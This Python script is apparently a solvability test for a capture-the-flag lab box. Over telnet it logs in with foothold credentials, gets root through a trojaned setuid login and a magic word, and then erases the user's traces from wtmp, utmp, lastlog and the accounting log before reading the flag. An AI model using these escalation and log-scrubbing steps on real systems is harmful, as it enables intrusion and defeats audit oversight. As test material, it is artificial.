#!/usr/bin/env python3
"""Box 2 "The Traced Call" SOLVE TEST.  Walk the intended chain over telnet:

    telnet brian  ->  read dono's toolkit cache (magic word + zap.c)
    ->  trojaned setuid `login` + magic word  ->  root
    ->  zap brian from wtmp/utmp/lastlog  +  grep -v brian the accounting log
    ->  the watcher (tripwire) releases the real flag into RAM

Exits 0 only if a uid=0 shell is reached AND the real flag (not the decoy) is
recovered after the logs are scrubbed.  The gate for "Box 2 is solvable".
"""
import os
import socket
import subprocess
import sys
import time

import pexpect

QEMU   = os.environ.get("QEMU_BIN", "qemu-system-i386")
IMAGE  = os.environ["BOX_IMAGE_ABS"]
MACHINE= os.environ.get("BOX_MACHINE", "pc")
CPU    = os.environ.get("BOX_CPU", "pentium")
MEM    = os.environ.get("BOX_MEM_MB", "128")
TPORT  = os.environ.get("BOX_FWD_TELNET", "2323")
FPORT  = os.environ.get("BOX_FWD_FTP", "2121")
SPORT  = os.environ.get("BOX_FWD_SHELL", "5514")
FUSER  = os.environ.get("BOX_FOOTHOLD_USER", "brian")
FPASS  = os.environ.get("BOX_FOOTHOLD_PASS", "newriver")
TRUSTU = os.environ.get("BOX_TRUST_USER", "dono")        # toolkit-cache home
MAGIC  = os.environ.get("BOX_LOGIN_MAGIC", "wank")
LOOTD  = os.environ.get("BOX_LOOT_DIR", "/var/account/.trophy")
ACCT   = os.environ.get("BOX_ACCT_LOG", "/var/account/awtmp")
INTERVAL = int(os.environ.get("BOX_WATCH_INTERVAL", "20"))
EXPECT = os.environ.get("BOX_EXPECT_FLAG", "")
DECOY  = os.environ.get("BOX_FLAG_DECOY", "")
SERLOG = os.environ.get("BOX_SOLVE_SERIAL", "work/solve2-serial.log")
NO_BOOT = os.environ.get("BOX_NO_BOOT")

def log(m): print(f"[solve2] {m}", file=sys.stderr, flush=True)
def reap(): subprocess.run(["pkill", "-9", "-f", os.path.basename(IMAGE)], check=False)

def boot_box():
    reap(); time.sleep(1)
    hostfwd = (f"hostfwd=tcp:127.0.0.1:{TPORT}-:23,"
               f"hostfwd=tcp:127.0.0.1:{FPORT}-:21,"
               f"hostfwd=tcp:127.0.0.1:{SPORT}-:513")
    keyf = os.environ.get("BOX_LUKS_KEYFILE_ABS", "")
    secret, drive = [], f"file={IMAGE},format=qcow2,if=ide,index=0,media=disk"
    if keyf and os.path.exists(keyf):
        secret = ["-object", f"secret,id=sec0,file={keyf}"]
        drive += ",encrypt.key-secret=sec0"
        log("(booting LUKS-encrypted image with key)")
    cmd = [QEMU, "-machine", f"{MACHINE},graphics=off", "-cpu", CPU, "-m", MEM,
           *secret, "-drive", drive,
           "-boot", "c", "-display", "none",
           "-serial", f"file:{SERLOG}", "-monitor", "none", "-no-reboot",
           "-netdev", f"user,id=n0,restrict=on,{hostfwd}",
           "-device", "ne2k_pci,netdev=n0"]
    log("booting box (host-only, telnet on 127.0.0.1:%s)" % TPORT)
    return subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def wait_telnet(deadline):
    log("waiting for multiuser boot + telnetd ...")
    while time.time() < deadline:
        try:
            socket.create_connection(("127.0.0.1", int(TPORT)), timeout=3).close()
            log("telnet port is open"); return True
        except OSError:
            time.sleep(5)
    return False

def main():
    box = None if NO_BOOT else boot_box()
    if NO_BOOT:
        log("BOX_NO_BOOT: solving an already-running box on 127.0.0.1:%s" % TPORT)
    try:
        if not wait_telnet(time.time() + 600):
            log("telnetd never came up — see %s" % SERLOG); return 1

        tn = None
        for attempt in range(16):
            time.sleep(10)
            tn = pexpect.spawn(f"telnet 127.0.0.1 {TPORT}", encoding="latin-1", timeout=60)
            tn.logfile_read = open(SERLOG.replace(".log", "-telnet.log"), "w", encoding="latin-1")
            try:
                tn.expect(r"login:", timeout=30); break
            except (pexpect.TIMEOUT, pexpect.EOF):
                log(f"telnet attempt {attempt+1}: no login yet (guest net warming up), retry")
                try: tn.close(force=True)
                except Exception: pass
                tn = None
        if tn is None:
            log("telnetd never presented a login prompt"); return 1

        # ---- foothold: log in as brian -------------------------------------
        tn.sendline(FUSER)
        tn.expect(r"[Pp]assword:", timeout=30); tn.sendline(FPASS)
        i = tn.expect([r"\$ ", r"% ", r"Login incorrect"], timeout=60)
        if i == 2:
            log("FOOTHOLD FAILED: %s/%s rejected" % (FUSER, FPASS)); return 2
        tn.sendline("stty -echo 2>/dev/null"); tn.expect([r"\$ ", r"% "], timeout=30)
        tn.sendline("PS1='BRIAN> '; export PS1"); tn.expect(r"BRIAN> ", timeout=30)
        log("foothold OK: logged in as %s" % FUSER)

        # ---- enumerate: the prior intruder's toolkit cache -----------------
        tn.sendline(f"ls /home/{TRUSTU} 2>&1"); tn.expect(r"BRIAN> ", timeout=30)
        log("cache (/home/%s): %s" % (TRUSTU, " ".join(tn.before.split())[-120:]))
        tn.sendline(f"test -f /home/{TRUSTU}/zap.c && echo HAVE_ZAP")
        tn.expect(r"BRIAN> ", timeout=30)
        if "HAVE_ZAP" not in tn.before:
            log("ENUM FAILED: zap.c not found in cache"); return 3
        # the magic word is discoverable via strings on the setuid login
        tn.sendline("ls -l /usr/bin/login 2>&1"); tn.expect(r"BRIAN> ", timeout=30)
        log("login perms: %s" % " ".join(tn.before.strip().splitlines()[-1].split()))

        # ---- escalate: trojaned setuid login + magic word ------------------
        tn.sendline("/usr/bin/login")
        k = tn.expect([r"login: ", r"BRIAN> "], timeout=30)
        if k == 1:
            log("PRIVESC FAILED: trojan login did not prompt"); return 4
        tn.sendline(MAGIC)
        time.sleep(1)
        # now in a root /bin/sh (echo state inherited); confirm via sentinel
        tn.sendline("id; echo ROOTCHK_X")
        tn.expect(r"ROOTCHK_X", timeout=20)
        if "uid=0" not in tn.before:
            log("PRIVESC FAILED: magic word did not yield uid=0 (%r)"
                % " ".join(tn.before.split())[-80:]); return 4
        log("privesc OK: uid=0 root shell via trojaned setuid login (magic '%s')" % MAGIC)

        def root(cmd, tmo=120):
            tn.sendline(cmd + "; echo X_$?_X")
            tn.expect(r"X_\d+_X", timeout=tmo)
            return tn.before

        # ---- the point of Box 2: cover your tracks -------------------------
        out = root(f"cat {LOOTD}/trophy.txt 2>&1")
        if DECOY and DECOY in out:
            log("trophy before cleanup: DECOY (the call was traced) — as expected")
        out = root(f"cc -o /tmp/zap /home/{TRUSTU}/zap.c 2>&1")
        if "error" in out.lower():
            log("ZAP COMPILE FAILED: %s" % " ".join(out.split())[-120:]); return 5
        root(f"/tmp/zap {FUSER} 2>&1")                              # wtmp/utmp/lastlog
        root(f"grep -v {FUSER} {ACCT} > /tmp/a && mv /tmp/a {ACCT}")  # accounting log
        # diagnostic: confirm the signature is gone from last/who/accounting
        chk = root(f"last {FUSER} 2>/dev/null | grep -c {FUSER}; who | grep -c {FUSER}; grep -c {FUSER} {ACCT}")
        log("post-scrub signature counts (last/who/acct): %s"
            % " ".join(chk.split()[-3:]) if chk.split() else "?")

        # ---- poll the trophy until the watcher releases the real flag ------
        flag = ""
        for attempt in range(20):
            out = root(f"cat {LOOTD}/trophy.txt 2>&1")
            f = ""
            for line in out.splitlines():
                if "BU{" in line:
                    f = line[line.index("BU{"):].split("}")[0] + "}"; break
            if f and f != DECOY:
                flag = f; break
            log("attempt %d: watcher still showing decoy — waiting for the sweep..." % (attempt + 1))
            time.sleep(INTERVAL // 2 + 3)
        if not flag:
            log("FLAG FAILED: watcher never released the real flag (logs not clean?)")
            tw = root("cat /root/.tripwire.log 2>/dev/null | tail -6")
            for ln in tw.splitlines():
                if ln.strip() and "X_" not in ln:
                    log("tripwire.log: %s" % ln.strip())
            return 6
        log("flag recovered: %s" % flag)
        # capture the genflag/tripwire trace for the record
        tr = root("cat /root/.tripwire.log 2>/dev/null | tail -3")
        for ln in tr.splitlines():
            if "clean" in ln or "overlay" in ln or "traces" in ln:
                log("tripwire: %s" % ln.strip())
        if EXPECT and flag != EXPECT:
            log("FLAG MISMATCH: got %s, expected %s" % (flag, EXPECT)); return 7

        log("=== SOLVE OK: foothold -> trojan login root -> cover tracks -> flag ===")
        print(flag)
        return 0
    except (pexpect.TIMEOUT, pexpect.EOF) as e:
        log("%s during solve — see %s and %s" % (type(e).__name__, SERLOG,
            SERLOG.replace(".log", "-telnet.log")))
        return 1
    finally:
        if not NO_BOOT:
            reap()
            if box is not None and box.poll() is None:
                box.terminate()

if __name__ == "__main__":
    sys.exit(main())
